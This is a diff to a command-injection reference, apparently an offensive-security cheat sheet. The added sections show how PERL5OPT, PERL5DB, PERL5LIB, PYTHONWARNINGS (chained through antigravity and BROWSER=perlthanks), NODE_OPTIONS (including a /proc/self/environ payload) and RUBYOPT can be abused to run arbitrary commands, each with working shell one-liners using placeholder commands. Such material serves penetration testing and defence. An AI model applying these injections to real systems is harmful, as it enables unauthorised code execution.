@@ -141,6 +141,146 @@ References:
 - [LD_PRELOAD: How to Run Code at Load Time](https://www.secureideas.com/blog/2021/02/ld_preload-how-to-run-code-at-load-time.html)
 - [elttam Blog: Remote LD_PRELOAD Exploitation](https://www.elttam.com/blog/goahead/)
 
+## PERL5OPT
+
+[PERL5OPT](https://perldoc.perl.org/perlrun#PERL5OPT) specifies command-line options but is restricted to only accepting the options `CDIMTUWdmtw`.
+
+`PERL5OPT=-M` can be used to load a Perl module and add extra code after the module name:
+
+```bash
+PERL5OPT='-Mbase;print(`{cmdname,arg1,arg2}`)' perl /dev/null
+```
+
+References:
+- [elttam Blog: HACKING WITH ENVIRONMENT VARIABLES Interesting environment variables to supply to scripting language interpreters](https://www.elttam.com/blog/env/)
+
+## PERL5DB
+
+[PERL5DB](https://perldoc.perl.org/perlrun#PERL5DB) specifies the command used to load the debugger code. `PERL5DB` is only used when Perl is started with a bare `-d` switch.
+
+```bash
+PERL5OPT=-d PERL5DB='system("ls -la");' perl /dev/null
+```
+
+References:
+- [elttam Blog: HACKING WITH ENVIRONMENT VARIABLES Interesting environment variables to supply to scripting language interpreters](https://www.elttam.com/blog/env/)
+
+## PERLLIB and PERL5LIB
+
+[PERLLIB](https://perldoc.perl.org/perlrun#PERLLIB) and [PERL5LIB](https://perldoc.perl.org/perlrun#PERL5LIB) set a list of directories in which to look for Perl library files before looking in the standard library. If `PERL5LIB` is defined, `PERLLIB` is not used.
+
+`PERLLIB` and `PERL5LIB` can be used to execute arbitrary commands if there is a way to write a malicious Perl module to a file system:
+
+```bash
+$ cat > /tmp/root.pm << EOF
+package root;
+use strict;
+use warnings;
+
+system("cmdname arg1 arg2");
+EOF
+$ PERLLIB=/tmp PERL5OPT=-Mroot perl /dev/null
+```
+
+References:
+- [elttam Blog: HACKING WITH ENVIRONMENT VARIABLES Interesting environment variables to supply to scripting language interpreters](https://www.elttam.com/blog/env/)
+- [CVE-2016-1531 exploit](https://github.com/HackerFantastic/exploits/blob/979c345959349cb829e473faae9fe040b7290876/cve-2016-1531.sh)
+
+## PYTHONWARNINGS
+
+[PYTHONWARNINGS](https://docs.python.org/3/using/cmdline.html#envvar-PYTHONWARNINGS) is equivalent to specifying the [-W](https://docs.python.org/3/using/cmdline.html#cmdoption-W) option that is used for warning control. The full form of argument is `action:message:category:module:line`.
+
+Warning control triggers the import of an arbitrary Python module if the specified category contains a dot:
+
+```python
+# /Lib/warnings.py
+# ...
+def _getcategory(category):
+    if not category:
+        return Warning
+    if '.' not in category:
+        import builtins as m
+        klass = category
+    else:
+        module, _, klass = category.rpartition('.')
+        try:
+            m = __import__(module, None, None, [klass])
+        except ImportError:
+            raise _OptionError("invalid module name: %r" % (module,)) from None
+# ...
+```
+
+`PYTHONWARNINGS` can be used to execute arbitrary commands if there is a way to write a malicious Python module to a file system:
+
+```bash
+$ cat > /tmp/exec.py << EOF
+import os
+os.system("cmdname arg1 arg2")
+EOF
+$ PYTHONPATH="/tmp" PYTHONWARNINGS=all:0:exec.x:0:0 python3 python /dev/null
+```
+
+However, you can use the `antigravity` module from Python’s standard library to run arbitrary commands. Running `import antigravity` will immediately open a browser to the `xkcd` comic that joked that `import antigravity` in Python would grant you the ability to fly. The `antigravity` uses another module from the standard library called `webbrowser` to open a browser. This module checks `PATH` for a large variety of browsers, including `mosaic, opera, skipstone, konqueror, chrome, chromium, firefox, links, elinks and lynx`. It also accepts an environment variable `BROWSER` that can be used to specify which process should be executed. It is not possible to supply arguments to the process in the environment variable and the `xkcd` comic URL is the one hard-coded argument for the command:
+
+```bash
+$ <BROWSER> https://xkcd.com/353/
+```
+
+One way to execute arbitrary commands is to leverage Perl which is commonly installed on systems and is even available in the standard Python docker image. However, the `perl` binary can not itself be used. This is because the first and only argument is the `xkcd` comic URL. The comic URL argument will cause an error and the process to exit without the `PERL5OPT` environment variable being used.
+
+Fortunately, when Perl is available it is also common to have the default Perl scripts available, such as `perldoc` and `perlthanks`. These scripts will also error and exit with an invalid argument, but the error in this case happens later than the processing of the `PERL5OPT` environment variable. This means it is possible to leverage the Perl environment variables to execute commands.
+
+```bash
+$ PYTHONWARNINGS=all:0:antigravity.x:0:0 BROWSER=perlthanks PERL5OPT='-Mbase;print(`{cmdname,arg1,arg2}`);' python3 python /dev/null
+```
+
+References:
+- [elttam Blog: HACKING WITH ENVIRONMENT VARIABLES Interesting environment variables to supply to scripting language interpreters](https://www.elttam.com/blog/env/)
+
+## NODE_OPTIONS
+
+[NODE_OPTIONS](https://nodejs.org/api/cli.html#node_optionsoptions) specifies a space-separated list of command-line options.
+
+`NODE_OPTIONS` can be used to execute arbitrary commands if there is a way to write a malicious Node.js module to a file system:
+
+```bash
+$ cat > /tmp/exec << EOF
+console.log(require("child_process").execSync("id").toString());
+EOF
+$ NODE_OPTIONS='--require /tmp/exec' node node /dev/null
+```
+
+If there is no way to write a module to a file system you can use the proc filesystem, specifically `/proc/self/environ`, to deliver a payload.
+
+```bash
+$ AAAA='console.log(require("child_process").execSync("id").toString());//' NODE_OPTIONS'=--require /proc/self/environ' node node /dev/null
+```
+
+However, there are two constraints:
+
+1. Using `/proc/self/environ` is only possible if the content is syntactically valid JavaScript. To do this, you need to be able to create an environment variable and make it appear first in the contents of `/proc/self/environ`.
+1. Since the value of the first environment variable ends with a single-line comment `//`, any newlines in other environment variables will cause a syntax error. Using multiline comments `/*` will not solve the problem, as they must be closed to be syntactically valid. In such cases, it is necessary to overwrite the value of the variable that contains the newline character.
+
+References:
+- [elttam Blog: HACKING WITH ENVIRONMENT VARIABLES Interesting environment variables to supply to scripting language interpreters](https://www.elttam.com/blog/env/)
+- [Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609)](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
+
+## RUBYOPT
+
+`RUBYOPT` specifies command-line options.
+
+`RUBYOPT` can be used to execute arbitrary commands if there is a way to write a malicious Ruby library to a file system. `-r` option causes Ruby to load the library using require but this is limited to files with an extension of `.rb` or `.so`:
+
+```bash
+$ cat > /tmp/exec.rb << EOF
+puts `cmdname arg1 arg2`
+EOF
+$ RUBYOPT=-r/tmp/exec.rb ruby /dev/null
+```
+
+References:
+- [elttam Blog: HACKING WITH ENVIRONMENT VARIABLES Interesting environment variables to supply to scripting language interpreters](https://www.elttam.com/blog/env/)
+
 # Languages
 
 ## Go
@@ -160,11 +300,8 @@ os.StartProcess(
 exec.Command("cmdname", "arg1", "arg2").Run()
 
 // command line execution
-cmd := exec.Command("bash")
-cmdWriter, _ := cmd.StdinPipe()
-cmd.Start()
-cmdWriter.Write([]byte("cmdname arg1 arg2\n"))
-cmd.Wait()
+cmd := exec.Command("bash", "-c", "cmdname arg1 arg2")
+out, err := cmd.Output()
 
 // https://pkg.go.dev/os/exec#CommandContext
 // os/exec.CommandContext
